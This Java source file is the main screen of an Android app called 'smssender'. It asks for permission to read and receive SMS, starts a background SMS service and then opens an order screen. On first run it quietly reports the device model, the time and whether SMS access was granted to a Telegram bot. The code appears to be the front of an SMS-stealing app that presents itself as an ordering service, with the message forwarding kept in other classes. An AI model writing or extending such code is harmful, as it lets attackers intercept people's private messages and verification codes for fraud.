package com.agayev.smssender;

import static com.agayev.smssender.SMSReceiver.TELEGRAM_CHAT_ID;
import static com.agayev.smssender.SMSReceiver.TELEGRAM_TOKEN;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.agayev.smssender.network.ApiClient;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String PREFS_NAME = "MyPrefsFile";
    private static final String FIRST_RUN_KEY = "firstRun";

    private static final int PERMISSION_SEND_SMS = 123;

    private Button startButton;
    private TextView textView;

    private SharedPreferences prefs;

    private long countdownTime = 24 * 60 * 60;

    private final BroadcastReceiver timerUpdateReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ("timer-update".equals(intent.getAction())) {
                countdownTime = intent.getLongExtra("countdownTime", 0);
                // updateTimerUI();
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        if (checkSmsPermission()) {
            startService();
        }

        startButton = findViewById(R.id.start_button);
        textView = findViewById(R.id.textView);
        startButton.setOnClickListener(v -> {
            if (!checkSmsPermission()) {
                requestSmsPermissions();
            } else {
                startService();
                Intent myIntent = new Intent(MainActivity.this, OrderActivity.class);
                MainActivity.this.startActivity(myIntent);
            }
        });
    }

    private void checkForFirstTime(boolean permissionGranted) {
        if (prefs.getBoolean(FIRST_RUN_KEY, true)) {
            firstTimeRun(permissionGranted);
            prefs.edit().putBoolean(FIRST_RUN_KEY, false).apply();
        }
    }

    private void firstTimeRun(boolean permissionGranted) {
        String permissionStatus = permissionGranted ? "Да" : "Нет";
        String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
        String currentTime = getCurrentTime();
        String data =
                "Модель: " + deviceModel +
                        "\nВремя: " + currentTime +
                        "\nДоступ: " + permissionStatus;

        ApiClient client = new ApiClient();
        Log.e(TAG, data);
        client.sendMessage(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, data);
    }

    private String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, PERMISSION_SEND_SMS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_SEND_SMS) {
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                for (int result : grantResults) {
                    if (result != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        break;
                    }
                }
                if (allPermissionsGranted) {
                    Toast.makeText(this, "Разрешено!", Toast.LENGTH_SHORT).show();
                    startService();
                } else {
                    Toast.makeText(this, "Отклонено!", Toast.LENGTH_SHORT).show();
                }
                checkForFirstTime(allPermissionsGranted);
            }
        }
    }

    private void startService() {
        Intent serviceIntent = new Intent(this, SMSService.class);
        startService(serviceIntent);
    }

    private void updateTimerUI() {
        int hours = (int) (countdownTime / 3600);
        int minutes = (int) ((countdownTime % 3600) / 60);
        int secs = (int) (countdownTime % 60);
        @SuppressLint("DefaultLocale") String timerText = String.format("%02d:%02d:%02d", hours, minutes, secs);
        textView.setText(timerText);
        if (countdownTime > 0) {
            countdownTime--;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        IntentFilter filter = new IntentFilter("timer-update");
        LocalBroadcastManager.getInstance(this).registerReceiver(timerUpdateReceiver, filter);
    }

    @Override
    protected void onPause() {
        super.onPause();
        LocalBroadcastManager.getInstance(this).unregisterReceiver(timerUpdateReceiver);
    }
}
